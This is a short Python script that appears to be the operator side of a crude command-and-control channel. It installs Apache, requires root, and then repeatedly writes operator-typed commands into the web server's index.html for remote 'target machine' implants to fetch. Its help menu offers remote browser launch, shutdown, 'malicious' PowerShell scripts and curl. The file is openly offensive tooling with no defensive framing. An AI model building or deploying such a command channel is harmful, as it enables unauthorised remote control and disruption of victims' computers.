import subprocess
import os
import time
subprocess.call("sudo apt install apache2",shell=True)
root = subprocess.check_output("whoami",shell=True)
root1 = str(root)
root2 = (root1[2:-3])
root3 = root2
if root3 == "root": 
    while True:
        print("enter a new comamnd for every 10 second\n")
        print(""" --help \n
1.start chrome => open the chrome browser on target machine\n
2.shutdown /s /t 1 \n
3.powershell  =>malicious scripts\n
4.curl \n
5.ctrl+c => exit
""")

        text1 = input(">>>>")
        text2 = str(text1)
        with open("index.html",mode='w')as files:
            files.write(text2)
            subprocess.call("rm -rf /var/www/html/index.html",shell=True)
            subprocess.call("mv index.html /var/www/html/",shell=True)
else:
    print("run as root")   
